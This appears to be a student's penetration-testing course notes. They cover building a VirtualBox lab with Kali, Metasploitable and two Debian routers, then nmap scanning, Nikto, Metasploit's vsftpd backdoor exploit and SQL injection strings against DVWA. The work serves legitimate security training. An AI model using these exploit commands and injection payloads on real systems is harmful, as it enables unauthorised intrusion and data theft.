-----VIRTUAL MACHINES
Virtual box
-Kali Linux
-Metasploitable
    https://sourceforge.net/projects/metasploitable/
    Linux 2.3/3.x/4.x(64-bit)
    1024mb
    use an existing 
    choose metasploitable

    settings> system > processor enable PAE/NX 
-Windows 10 
VirtualBox> file> import appliance: choose windows image



-----TCP/IP MODEL
Aplication
Trasport
Internet
Link


-----ROUTING - Installing Debian in virtual box

-Router 1
    name: Router1
    512 mb 
    create virtual hard disk now 
    vdi
    dinamically allocated
    8gb

-configuration
    system > processor: enable PAE/NX
    storage: load debian image

-start
    not select desktop environment
    select ssh server
    power off machine 

-configuration
    network > adapter 1 > internal network
        name: internal-10
    network > adapter 2 > internal network
        name: internal-100

ls /sys/class/net/          check the network interfaces that are configured

-nano /etc/network/interfaces
    auto enp0s3
    iface enp0s3 inet static
        address 192.168.10.254
        netmask 255.255.255.0

    auto enp0s8
    iface enp0s8 inet static
        address 192.168.100.1
        netmask 255.255.255.0
        ctrl x to exit

    cat /etc/network/interfaces     check the modified file
    shutdown -h now                 shutdown the virtual machine
    restart machine


-----CLONING MACHINE - 2nd ROUTER 

-Router 2
    name it Router2 and check the reset mac address box
    linked clone

    network > adapter1
        change internal-10 for 100
    network > adapter2 
        change internal-100 for 20
    start
    login as root user

nano /etc/network/interfaces
    auto enp0s3
    iface enp0s3 inet static
        address 192.168.100.2
        netmask 255.255.255.0

    auto enp0s8
    iface enp0s8 inet static
        address 192.168.20.254
        netmask 255.255.255.0
        ctrl x to exit

nano /etc/hosts
    change the hostname to Router2 
nano /etc/hostname 
    change the hostname to Router2 
reboot 

-start the original router
-in Router2 
    ping 192.168.100.2  okk
    ping 192.168.10.254 no connectivity yet 



-----CONFIGURING ROUTES     KALI>>> ROUTER1 --- ROUTER2 <<< METASPLOITABLE

-Connect the Kali machine to the Metasploitable machine through the 2 routers

-Kali machine > configuration > network >adapter1
    Internal network
        name: internal 10

-Metasploitable machine > configuration > network > adapter1
    Internal network
        name: internal 20

start both machines
ip route show           it show the routes configured

-In Router1 
    ip route add 192.168.20.0/24 via 192.168.100.2 dev enp0s8
-In Router2
    ip route add 192.168.10.0/24 via 192.168.100.1 dev enp0s3

-start kali machine 
edit connections > ipv4 > manual
    address 192.168.10.10       segment ip address
    netmask 255.255.255.0       24 mask
    gateway 192.168.10.254      this was configured for router #1
save and restart ethernet connection

Kali termninal
    ifconfig
    ping 192.168.10.254         connection to the router1
    ping 192.168.100.2          *no connectivity yet


-Active packet routing
Router1
    nano /proc/sys/net/ipv4/ip_forward
        change 0 for 1
Router2
    nano /proc/sys/net/ipv4/ip_forward
        change 0 for 1

    ping 192.168.100.2          *there is connectivity now


-Metasploitable
    login with: msfadmin, and password: msfmadmin
    sudo su 
-nano /etc/network/interfaces
    auto eth0
    iface eth0 inet static
        address 192.168.20.34
        netmask 255.255.255.0
        network 192.168.20.0
        broadcast 192.168.20.255
        gateway 192.168.20.254

reboot 
ping 192.168.10.10      check connection to kali machine 

*******
To make the route permanent, you'll need to add it to the network configuration file, 
    with the "up" parameter preceding it, like so:

up ip route add 192.168.20.0/24 via 192.168.100.2 dev enp0s8

To make routing permanent, you must edit the /etc/sysctl.conf file and add the line:

net.ipv4.ip_forward = 1

In many cases this line may already exist in the file and you only need to remove the comment identifier (#).

                                    
                                    
            ------------P E N T E S T I N G-----------------
RECOGNITION

-------WHOIS 
Is a request/response-based TCP protocol for querying a database to determine the owner of a domain name or IP address on the Internet.

-Kali 
    settings > network > adapter1 >attached to 'NAT'
    or create a linked clone to modify the configuration without losing the first configuration

who is unam.mx
who is platzi.com


------NETCRAFT
offers market share analysis of web servers and hosting, including the detection of the type of web server and operating system.
Resources > site report


------HTTRACK
if not installed
    sudo apt install httrack 
clone a website
    create a directory: copy
    httrack www.somesite.com -O copy/

man httrack to see more flags


------RECON-NG
For version 5.1.1 of Recong-ng

install all modules
    marketplace install all

see the list of modules
    modules search

use a module (change the ending according to the name of the module you are going to use)
    modules load mymodule

view info
    info

define an option
    options set SOURCE somesite

execute
    run

return to modules
    back


------ TCP AND UDP PROTOCOL ANALYSIS
UDP: Connectionless, used in streaming services for video and voice transmission.
TCP: Connection-oriented guarantees connectivity from one point to another, through the three-way handshake

-most common ports
20 FTP TRANSFER
21 FTP
22 SSH
23 TELNET
25 SMTP
53 DNS
80 HTTP
137-139 BIOS
443 HTTPS
445SMB
1433 MSSQL
3306 MySQL
3389 RDP
5800 VNC OVER HTTP
5900 NCV


------IP AND PORT SCANNING

-What is ICMP?
    To exchange status data or error messages, nodes use the 
    Internet Control Message Protocol (ICMP) on TCP/IP networks.

    Specifically, application servers and gateways such as routers 
    use this implementation of the IP protocol to return datagram problem 
    messages to the sender of the packet.

-man fping
fping -a -g 192.168.20.0/24                 configure the range of ip's to send ping packets
fping -a -g 192.168.20.0/24 > hosts.txt
    The -a parameter: shows live systems
    The -g parameter: generates a list

    response 
    192.168.20.34 metasploitable machine
    192.168.20.254 router gateway 

nmap 192.168.20.34 
nmap -sP 192.168.20.*       scan number of hosts 

nmap -p- 192.168.20.34      scan all ports
nmap -p80 192.168.20.34     scan a specific port '80'


-Full stealth scan and only in controlled scenarios
nmap -sS -O -sV -v (target_address)     requires root permissions

    -sS : TCP SYN/connect()/ACK/Window/Maimon scans
    -O: Enable OS detection
    -sV : Poll open ports to determine service/version information
    -v : Increase verbosity level (use -vv for greater effect)



------WIRESHARK - TCP analysis 

nmap -sT -p22 192.168.20.34             tcp and port 22 analysis
nmap -Pn -sT -p22 192.168.20.34         ignore discovery phase
nmap -Pn -p22 192.168.20.34             basic scan


-----IP'S SCAN WITH NMAP 
nmap -sn 192.168.20.34              do only the discovery phase, no port response
nmap -sn -iL hosts.txt              scan input list 
nmap -sn 192.168.20.1-40



NMAP GUIDE
Network exploration tool and security / port scanner

root@kali:~# nmap -h
Nmap 7.92 ( https://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}

TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  --exclude-ports <port ranges>: Exclude the specified ports from scanning
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script=default
  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
  --script-args-file=filename: provide NSE script args in a file
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
  --script-help=<Lua scripts>: Show help about scripts.
           <Lua scripts> is a comma-separated list of script-files or
           script-categories.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
  --data <hex string>: Append a custom payload to sent packets
  --data-string <string>: Append a custom ASCII string to sent packets
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --noninteractive: Disable runtime interactions via keyboard
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (https://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES


-------XMAS SCAN
nmap -Pn -sX -p22 192.168.20.34         requires root permission, response open | filtered,
                                        such a packet could penetrate a firewall
nmap -Pn -sX -p1-50 192.168.20.34 


------NULL 
nmap -sN -p22 192.168.20.34             tcp no activity flags, some security devices could 
nmap -sN -p1-50 192.168.20.34             not have policies to block this packet.


-----NMAP SCRIPTING 
Banner grabbing: the technique of grabbing information of a system available on a certain network and all 
    the services running on its open ports

nmap --script banner 192.168.20.34 

search for vulnerabilities
nmap --script vuln 192.168.20.34  


------OPENVAS 
apt-get install openvas 
-----?----?-----

------WEB SERVICES ANALYSIS
-NIKTO   
websites vulnerabilities scanning 

nikto -h 192.168.20.31      (h=host)

Directory indexing found
192.168.20.34/doc/
it shows a public directory 


------METASPLOIT 
initialize postgresql database 
    service postgresql start 
Enter the metasploit admin console
    msfconsole 
    search vsftpd (previously found using nmap --script vuln)
    use exploit/unix/ftp/vsftpd_234_backdoor
        show options 
    set RHOST 192.168.20.34     (confi.20g remote host)
        run
    
------ARMITAGE (graphical interface for metasploit)
sudo apt update
sudo apt install armitage
sudo apt upgrade
sudo service postgresql start
sudo msfdb init
sudo armitage>

--------BURPSUITE
spidering


--------SQL INJECTION, DVWA 
Injection Syntax:
WHERE user_id = '%' or '0'='0'
UNION SELECT null,version()'

write in the empty field:

%' or '0'='0'

%' or '0'='0'
UNION SELECT null,version()'

%' or '0'='0' UNION SELECT null,user()'

%' or '0'='0' UNION SELECT null,database()'

